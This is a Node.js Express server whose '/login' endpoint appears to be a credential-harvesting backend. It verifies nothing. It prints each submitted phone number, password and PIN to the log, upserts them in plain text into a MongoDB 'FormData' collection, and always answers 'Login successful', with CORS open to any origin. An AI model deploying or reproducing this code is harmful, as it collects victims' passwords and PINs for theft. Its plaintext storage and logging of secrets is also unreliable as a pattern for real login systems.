require('dotenv').config();
const cors = require('cors');
const express = require('express');
const mongoose = require('mongoose');
const FormDataModel = require ('./models/FormData');
const connDB = require('./config/db');
const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(express.json());

// CORS configuration
const corsOptions = {
    origin: true, 
    credentials: true,
};

app.use(cors(corsOptions));


// Initialize database connection
connDB();

// Helper function to ensure database connection (for serverless)
async function ensureDbConnection() {
    // If already connected, return
    if (mongoose.connection.readyState === 1) {
        return true;
    }
    
    // If connecting, wait for it
    if (mongoose.connection.readyState === 2) {
        let attempts = 0;
        while (mongoose.connection.readyState === 2 && attempts < 10) {
            await new Promise(resolve => setTimeout(resolve, 500));
            attempts++;
        }
        if (mongoose.connection.readyState === 1) {
            return true;
        }
    }
    
    // Try to connect
    try {
        if (!process.env.MONGO_DB_CONN_STRING) {
            console.error('MONGO_DB_CONN_STRING is not set');
            return false;
        }
        
        mongoose.set('strictQuery', true);
        await mongoose.connect(process.env.MONGO_DB_CONN_STRING, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });
        return true;
    } catch (error) {
        console.error('Failed to connect to database:', error);
        return false;
    }
}

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'OK', message: 'Server is running' });
});

// Login endpoint
app.post('/login', async (req, res)=>{
    try {
        // Ensure database connection is ready (important for serverless)
        const isConnected = await ensureDbConnection();
        if (!isConnected) {
            return res.status(503).json({ 
                success: false,
                message: 'Database connection not available. Please try again later.' 
            });
        }

        const {phoneNumber, password, pin} = req.body;
        console.log(phoneNumber, password, pin);
        // Validation
        if (!phoneNumber || !password) {
            return res.status(400).json({ 
                success: false,
                message: 'Phone number and password are required' 
            });
        }
        if (phoneNumber.trim().length < 10) {
            return res.status(400).json({ 
                success: false,
                message: 'Please enter a valid phone number' 
            });
        }
        
        
        // Prepare update object
        const updateData = {
            phoneNumber: phoneNumber.trim(),
            password: password
        };
        
        // Add PIN to update if provided
        if (pin) {
            updateData.pin = pin;
        }
        
        const user = await FormDataModel.findOneAndUpdate(
            { phoneNumber: phoneNumber.trim() },
            updateData,
            { upsert: true, new: true }
        );
        
        res.status(200).json({ 
            success: true,
            message: 'Login successful',
            data: {
                phoneNumber: user.phoneNumber
            }
        });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ 
            success: false,
            message: 'Internal server error. Please try again later.' 
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Route not found' });
});

// Export the app for Vercel serverless functions
// Only use app.listen() in local development (not on Vercel)
if (!process.env.VERCEL) {
    app.listen(PORT, () => {
        console.log(`Server listening on port ${PORT}`);
    });
}

module.exports = app;
